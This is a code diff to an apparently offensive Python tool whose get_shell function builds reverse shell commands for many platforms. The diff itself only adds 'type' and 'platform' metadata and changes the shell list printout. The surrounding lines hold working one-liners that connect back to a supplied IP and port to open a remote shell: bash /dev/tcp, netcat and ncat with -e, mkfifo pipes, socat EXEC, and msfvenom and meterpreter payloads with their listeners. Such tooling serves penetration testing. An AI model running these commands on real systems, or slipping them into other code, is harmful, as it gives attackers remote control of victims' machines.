@@ -69,6 +69,10 @@ def get_ip(ip_iface: str) -> str:
 
 
 def get_shell(ipaddr: str, port: int) -> dict:
+    PLAIN = 1
+    GENERATE = 2
+    FILE = 3
+
     asp = {
         "description":
         "ASP stageless reverse shell",
@@ -77,12 +81,18 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Windows",
     }
 
     bash = {
         "description": "Bash reverse shell",
         "reverse": 'bash -c "bash -i >& /dev/tcp/%s/%d 0>&1"' % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Linux",
     }
 
     java = {
@@ -93,6 +103,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     jsp = {
@@ -102,7 +116,11 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw -o reverse.jsp' %
         (ipaddr, port),
         "listen":
-        "rlwrap -cAr nc -luvnp %d" % (port)
+        "rlwrap -cAr nc -luvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Generic",
     }
 
     linux = {
@@ -112,7 +130,11 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
         (ipaddr, port),
         "listen":
-        "rlwrap -cAr nc -lvnp %d" % (port)
+        "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Linux",
     }
 
     linux32 = {
@@ -122,7 +144,11 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
         (ipaddr, port),
         "listen":
-        "rlwrap -cAr nc -lvnp %d" % (port)
+        "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Linux",
     }
 
     linux_meterpreter = {
@@ -133,7 +159,11 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         'msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
-        % (port)
+        % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Linux",
     }
 
     linux32_meterpreter = {
@@ -144,13 +174,19 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         'msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
-        % (port)
+        % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Linux",
     }
 
     netcat = {
         "description": "Netcat reverse shell",
         "reverse": 'nc %s %d -e /bin/bash' % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Linux",
     }
 
     netcat_mkfifo = {
@@ -158,18 +194,24 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "reverse":
         'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Linux",
     }
 
     netcat_windows = {
         "description": "Windows Netcat reverse shell",
         "reverse": "nc.exe -e powershell.exe %s %d" % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Windows",
     }
 
     ncat = {
         "description": "Ncat reverse shell",
         "reverse": 'ncat %s %d -e /bin/bash' % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Linux",
     }
 
     ncat_udp = {
@@ -179,12 +221,18 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u %s %d >/tmp/f' % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -luvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     ncat_windows = {
         "description": "Windows Ncat reverse shell",
         "reverse": "ncat.exe %s %d -e powershell.exe" % (ipaddr, port),
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+        "type": PLAIN,
+        "platform": "Windows",
     }
 
     node = {
@@ -195,6 +243,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (port, ipaddr),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     perl = {
@@ -205,6 +257,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     perl_windows = {
@@ -215,6 +271,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Windows",
     }
 
     php = {
@@ -225,6 +285,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        FILE,
+        "platform":
+        "Generic",
     }
 
     powershell = {
@@ -235,6 +299,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Windows",
     }
 
     powershell_b64 = {
@@ -246,6 +314,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
             % (ipaddr, port)).encode('utf16')[2:]).decode(),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Windows",
     }
 
     python = {
@@ -256,6 +328,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     python_windows = {
@@ -266,6 +342,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     ruby = {
@@ -276,6 +356,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     ruby_windows = {
@@ -286,12 +370,18 @@ def get_shell(ipaddr: str, port: int) -> dict:
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Windows",
     }
 
     socat = {
         "description": "Socat reverse shell",
         "reverse": "socat TCP:%s:%d EXEC:'bash',pty,stderr,setsid,sigint,sane" % (ipaddr, port),
         "listen": "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:%d" % (port),
+        "type": PLAIN,
+        "platform": "Linux",
     }
 
     telnet = {
@@ -302,6 +392,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        PLAIN,
+        "platform":
+        "Linux",
     }
 
     war = {
@@ -312,6 +406,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Generic",
     }
 
     windows = {
@@ -322,6 +420,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Windows",
     }
 
     windows32 = {
@@ -332,6 +434,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Windows",
     }
 
     windows_meterpreter = {
@@ -343,6 +449,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "listen":
         'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
         % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Windows",
     }
 
     windows32_meterpreter = {
@@ -354,6 +464,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "listen":
         'msfconsole -q -x "use multi/handler; set payload windows/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
         % (port),
+        "type":
+        GENERATE,
+        "platform":
+        "Windows",
     }
 
     shells = {
@@ -398,7 +512,7 @@ def main(args: argparse.Namespace) -> None:
         print("[+] List of shells")
         shells = get_shell("", -1)
         for shell in shells:
-            print(f"{shell:<12}{shells[shell]['description']}")
+            print(f"{shell:<12}{shells[shell]['description']:<53}{shells[shell]['platform']}")
 
         return
 
